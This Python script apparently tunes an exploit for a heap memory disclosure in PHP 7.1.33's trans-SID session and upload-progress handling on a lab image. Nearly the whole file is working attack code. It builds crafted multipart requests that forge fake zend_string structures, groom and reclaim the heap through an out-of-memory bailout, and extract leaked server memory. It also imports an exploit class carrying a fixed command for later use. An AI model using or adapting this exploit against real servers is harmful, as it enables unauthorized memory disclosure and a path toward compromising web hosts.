#!/usr/bin/env python3
"""Tune the PHP 7.1.33 trans-SID A1/B1 disclosure on the exact lab image."""

from __future__ import annotations

import argparse
import json
import re
import socket
import struct
import sys
import time
from pathlib import Path


HARNESS = Path("/harness")
sys.path.insert(0, str(HARNESS))

from exploit import Target  # noqa: E402
from php81_trans_sid import (  # noqa: E402
    FIXED_COMMAND,
    MultipartDocument,
    Php81TransSidExploit,
)
from profile import Profile, ProfileError, parse_hex  # noqa: E402


PROFILE = Path("/probe/php-7.1.33-apache-amd64-trans-sid.json")


class Php71TransSidExploit(Php81TransSidExploit):
    """PHP 7.1 SID strings use unpersistent IS_STRING (0x6), not 0x16."""

    def _forge_b1_value(self, pages: int, index: int) -> bytes:
        spec = self.recipe["b1"]
        length = pages * self.page_size - int(spec["allocator_overhead"])
        value = bytearray(b"A" * length)
        header = parse_hex(spec["target_offset"], "b1.target_offset") - int(
            spec["value_data_offset"]
        )
        if header < 0 or header + 0x20 > length:
            raise ProfileError("PHP 7.1 B1 fake zend_string falls outside its carrier")
        struct.pack_into(
            "<IIQQ",
            value,
            header,
            0,
            0x6,
            0,
            parse_hex(spec["fake_len"], "b1.fake_len"),
        )
        value[header + 0x18:header + 0x20] = self._tag(index)
        self._patch_safe_mod_data(value)
        return bytes(value)

    def _plain_b1_value(self, pages: int) -> bytes:
        value = bytearray(super()._plain_b1_value(pages))
        self._patch_safe_mod_data(value)
        return bytes(value)

    def _patch_safe_mod_data(self, value: bytearray) -> None:
        main_offset = getattr(self, "safe_mod_data_offset", None)
        if main_offset is None:
            return
        data_offset = int(self.recipe["b1"]["value_data_offset"])
        within_value = main_offset - data_offset
        if within_value < 0 or within_value + 0x30 > len(value):
            raise ProfileError("PHP 7.1 safe ps_files structure is outside carrier")
        value[within_value:within_value + 0x30] = b"\x00" * 0x30
        struct.pack_into("<i", value, within_value + 0x2C, -1)

    def build_a1_scalar_oom(self, oom_len: int) -> tuple[bytes, bytes, str]:
        """Finish one tracked file, then trigger the bailout in a scalar field."""

        spec = self.recipe["a1"]
        boundary = b"C" * int(spec["boundary_len"])
        document = MultipartDocument(boundary)
        document.field(self.runtime["session_name"].encode("ascii"), b"\x00")
        ctype_lengths = tuple(int(value) for value in spec["ctype_lengths"])
        for index in range(int(spec["nested_parts"])):
            name = self._nested_name(index, int(spec["depth"]), int(spec["key_pad"]))
            if index < len(ctype_lengths):
                filename = b"A"
                content_type = b"C" * ctype_lengths[index]
            else:
                filename = b""
                content_type = b"application/octet-stream"
            document.field(name, filename=filename, content_type=content_type)

        def series(prefix: str, index: int, width: int, length: int) -> bytes:
            stem = f"{prefix}{index:0{width}d}".encode("ascii")
            return stem.ljust(length, prefix.encode("ascii"))

        small = spec["small_fillers"]
        for index in range(int(small["count"])):
            document.field(
                series("f", index, 4, int(small["name_len"])),
                b"v" * int(small["value_len"]),
            )
        large = spec["large_fields"]
        for index in range(int(large["count"])):
            document.field(
                series("b", index, 4, 5), b"B" * int(large["value_len"])
            )
        burners = spec["burners"]
        for index in range(int(burners["count"])):
            document.field(
                series("u", index, 2, 3), b"U" * int(burners["value_len"])
            )
        pad = spec["pad"]
        document.field(b"p" * int(pad["name_len"]), b"P" * int(pad["value_len"]))
        document.field(
            self.runtime["upload_progress_name"].encode("ascii"),
            b"k" * int(spec["progress_len"]),
        )
        for group in spec["pre_file_scalars"]:
            prefix = str(group["prefix"])
            fill = str(group["fill"]).encode("ascii")
            for index in range(int(group["count"])):
                document.field(
                    series(prefix, index, 3, int(group["name_len"])),
                    fill * int(group["value_len"]),
                )
        for index, raw_length in enumerate(spec["pre_file_mix"]):
            document.field(f"m{index:03d}".encode("ascii"), b"M" * int(raw_length))
        document.field(
            b"q", b"D", filename=b"a.txt", content_type=b"text/plain"
        )
        document.field(b"boom", b"O" * oom_len)
        return document.finish(), boundary, self.query()

    def build_b1_without_session_start(
        self,
        *,
        include_session_id: bool,
        include_progress: bool,
        progress_tail: bool,
        file_after_progress: bool,
        prefix_count: int,
        prefix_value_len: int,
    ) -> tuple[bytes, bytes, str]:
        """Build the B1 heap reclaim while optionally omitting session fields."""

        spec = self.recipe["b1"]
        boundary = b"C" * int(spec["boundary_len"])
        document = MultipartDocument(boundary)
        for index in range(prefix_count):
            document.field(
                f"z{index:03d}".encode("ascii"), b"Z" * prefix_value_len
            )
        if include_session_id:
            document.field(self.runtime["session_name"].encode("ascii"), b"a")
        if include_progress and not progress_tail:
            document.field(
                self.runtime["upload_progress_name"].encode("ascii"), b"k0"
            )
        name_len = int(spec["name_len"])
        index = 0

        def name(prefix: str, number: int, width: int) -> bytes:
            stem = f"{prefix}{number:0{width}d}".encode("ascii")
            return stem.ljust(name_len, prefix.encode("ascii"))

        for _ in range(int(spec["head_forged_fields"])):
            document.field(
                name("f", index, 4),
                self._forge_b1_value(int(spec["forged_pages"]), index),
            )
            index += 1
        document.field(
            name("f", index, 4), self._plain_b1_value(int(spec["partial_flood_pages"]))
        )
        index += 1
        for _ in range(int(spec["tail_forged_fields"])):
            document.field(
                name("f", index, 4),
                self._forge_b1_value(int(spec["forged_pages"]), index),
            )
            index += 1
        for _ in range(int(spec["nested_fillers"])):
            nested = f"x{index:05d}".encode("ascii") + b"[a]" * 12
            document.field(nested, b"v")
            index += 1
        if include_progress and progress_tail:
            document.field(
                self.runtime["upload_progress_name"].encode("ascii"), b"k0"
            )
        if file_after_progress:
            document.field(
                b"q", b"x", filename=b"a.txt", content_type=b"text/plain"
            )
        return document.finish(), boundary, self.query()


def status(response: bytes) -> str:
    line = response.partition(b"\r\n")[0]
    match = re.fullmatch(rb"HTTP/1\.[01] ([0-9]{3})(?: .*)?", line)
    return match.group(1).decode("ascii") if match else "none"


parser = argparse.ArgumentParser()
parser.add_argument("--large", type=int, default=8000)
parser.add_argument("--burner", type=int, default=4000)
parser.add_argument("--file-name-len", type=int, default=3064)
parser.add_argument("--filename-len", type=int, default=196608)
parser.add_argument("--ctype-len", type=int, default=24)
parser.add_argument("--file-value-len", type=int, default=1)
parser.add_argument("--pad", type=int, default=1216)
parser.add_argument("--mix2", type=int, default=400)
parser.add_argument("--extra-count", type=int, default=12)
parser.add_argument("--extra-value-len", type=int, default=128)
parser.add_argument("--b1-target-offset", type=lambda text: int(text, 0), default=0x126260)
parser.add_argument("--b1-fake-len", type=lambda text: int(text, 0), default=0x400000)
parser.add_argument("--b1-forged-pages", type=int, default=294)
parser.add_argument("--b1-head", type=int, default=13)
parser.add_argument("--b1-partial-pages", type=int, default=400)
parser.add_argument("--b1-tail", type=int, default=2)
parser.add_argument("--b1-nested", type=int, default=900)
parser.add_argument("--label", required=True)
parser.add_argument("--broad-b1", action="store_true")
parser.add_argument("--only-a1", action="store_true")
parser.add_argument("--pause-after-a1", action="store_true")
parser.add_argument("--omit-b1-php-session-id", action="store_true")
parser.add_argument("--omit-b1-progress", action="store_true")
parser.add_argument("--b1-safe-mod-data-offset", type=lambda text: int(text, 0))
parser.add_argument("--b1-progress-tail", action="store_true")
parser.add_argument("--b1-file-after-progress", action="store_true")
parser.add_argument("--b1-prefix-count", type=int, default=0)
parser.add_argument("--b1-prefix-value-len", type=int, default=0)
parser.add_argument("--a1-scalar-oom-len", type=int, default=0)
parser.add_argument("--a1-query-fields", type=int, default=5)
parser.add_argument("--b1-query-fields", type=int, default=5)
parser.add_argument("--control-after-a1", action="store_true")
args = parser.parse_args()

if not re.fullmatch(r"[A-Za-z0-9_.-]+", args.label):
    raise SystemExit("invalid label")

out = Path("/results") / args.label
out.mkdir(parents=True, exist_ok=False)
raw = json.loads(PROFILE.read_text(encoding="utf-8"))
a1 = raw["request_recipe"]["a1"]
a1["large_fields"]["value_len"] = args.large
a1["burners"]["value_len"] = args.burner
a1["file"]["name_len"] = args.file_name_len
a1["file"]["filename_len"] = args.filename_len
a1["file"]["content_type_len"] = args.ctype_len
a1["file"]["value_len"] = args.file_value_len
a1["pad"]["value_len"] = args.pad
a1["pre_file_mix"][1] = args.mix2
a1["pre_file_scalars"][-1]["count"] = args.extra_count
a1["pre_file_scalars"][-1]["value_len"] = args.extra_value_len
b1 = raw["request_recipe"]["b1"]
b1["target_offset"] = hex(args.b1_target_offset)
b1["fake_len"] = hex(args.b1_fake_len)
b1["forged_pages"] = args.b1_forged_pages
b1["head_forged_fields"] = args.b1_head
b1["partial_flood_pages"] = args.b1_partial_pages
b1["tail_forged_fields"] = args.b1_tail
b1["nested_fillers"] = args.b1_nested
profile = Profile(PROFILE, raw, raw["id"])

address = socket.gethostbyname("target")
target = Target("http://target/index.php", [address], timeout=30.0)
engine = Php71TransSidExploit(target, profile, FIXED_COMMAND)
engine.safe_mod_data_offset = args.b1_safe_mod_data_offset

if args.a1_scalar_oom_len:
    body, boundary, query = engine.build_a1_scalar_oom(args.a1_scalar_oom_len)
else:
    body, boundary, query = engine.build_a1()
query = "&".join(f"q{index}=v" for index in range(args.a1_query_fields))
(out / "parameters.json").write_text(
    json.dumps({**vars(args), "a1_length": len(body), "target_address": address}, indent=2) + "\n",
    encoding="utf-8",
)
a1_response = target.post_chunked(body, boundary, query=query, read_cap=1 << 20, timeout=180.0)
(out / "a1.response").write_bytes(a1_response)
del body

if args.pause_after_a1:
    (out / "a1.ready").write_text("ready\n", encoding="ascii")
    deadline = time.monotonic() + 180
    while not (out / "continue").exists():
        if time.monotonic() >= deadline:
            raise TimeoutError("timed out waiting for local calibration release")
        time.sleep(0.05)

if args.control_after_a1:
    control_boundary = b"CONTROL71"
    control_document = MultipartDocument(control_boundary)
    control_document.field(b"x", b"v")
    control_response = target.post_chunked(
        control_document.finish(), control_boundary, read_cap=1 << 20, timeout=30.0
    )
    (out / "control.response").write_bytes(control_response)

if args.only_a1:
    summary = {"a1_status": status(a1_response), "a1_response_length": len(a1_response)}
    (out / "summary.json").write_text(json.dumps(summary, indent=2) + "\n", encoding="utf-8")
    print(json.dumps(summary, sort_keys=True), flush=True)
    raise SystemExit(0)

if args.broad_b1:
    boundary = b"C" * int(b1["boundary_len"])
    document = MultipartDocument(boundary)
    document.field(raw["runtime"]["session_name"].encode("ascii"), b"a")
    document.field(raw["runtime"]["upload_progress_name"].encode("ascii"), b"k0")
    qword = struct.pack("<Q", 0x10000)

    def broad_value(pages: int) -> bytes:
        length = pages * 4096 - int(b1["allocator_overhead"])
        return (qword * ((length + 7) // 8))[:length]

    index = 0
    for _ in range(int(b1["head_forged_fields"])):
        document.field(f"f{index:04d}".encode().ljust(int(b1["name_len"]), b"f"), broad_value(int(b1["forged_pages"])))
        index += 1
    document.field(f"f{index:04d}".encode().ljust(int(b1["name_len"]), b"f"), broad_value(int(b1["partial_flood_pages"])))
    index += 1
    for _ in range(int(b1["tail_forged_fields"])):
        document.field(f"f{index:04d}".encode().ljust(int(b1["name_len"]), b"f"), broad_value(int(b1["forged_pages"])))
        index += 1
    for _ in range(int(b1["nested_fillers"])):
        document.field(f"x{index:05d}".encode() + b"[a]" * 12, b"v")
        index += 1
    body = document.finish()
    query = engine.query()
else:
    if (
        args.omit_b1_php_session_id
        or args.omit_b1_progress
        or args.b1_progress_tail
        or args.b1_file_after_progress
        or args.b1_prefix_count
    ):
        body, boundary, query = engine.build_b1_without_session_start(
            include_session_id=not args.omit_b1_php_session_id,
            include_progress=not args.omit_b1_progress,
            progress_tail=args.b1_progress_tail,
            file_after_progress=args.b1_file_after_progress,
            prefix_count=args.b1_prefix_count,
            prefix_value_len=args.b1_prefix_value_len,
        )
    else:
        body, boundary, query = engine.build_b1()
query = "&".join(f"q{index}=v" for index in range(args.b1_query_fields))

b1_response = target.post_chunked(body, boundary, query=query, read_cap=20 << 20, timeout=600.0)
(out / "b1.response").write_bytes(b1_response)
del body
summary = {
    "a1_status": status(a1_response),
    "a1_response_length": len(a1_response),
    "b1_status": status(b1_response),
    "b1_response_length": len(b1_response),
}
try:
    leak = engine.extract_b1_leak(b1_response)
except Exception as exc:
    summary["leak_error"] = f"{type(exc).__name__}: {exc}"
else:
    (out / "b1.leak").write_bytes(leak)
    summary["leak_length"] = len(leak)
    summary["leak_prefix_hex"] = leak[:32].hex()
    summary["stale_oversized"] = len(leak) > 32
(out / "summary.json").write_text(json.dumps(summary, indent=2) + "\n", encoding="utf-8")
print(json.dumps(summary, sort_keys=True), flush=True)
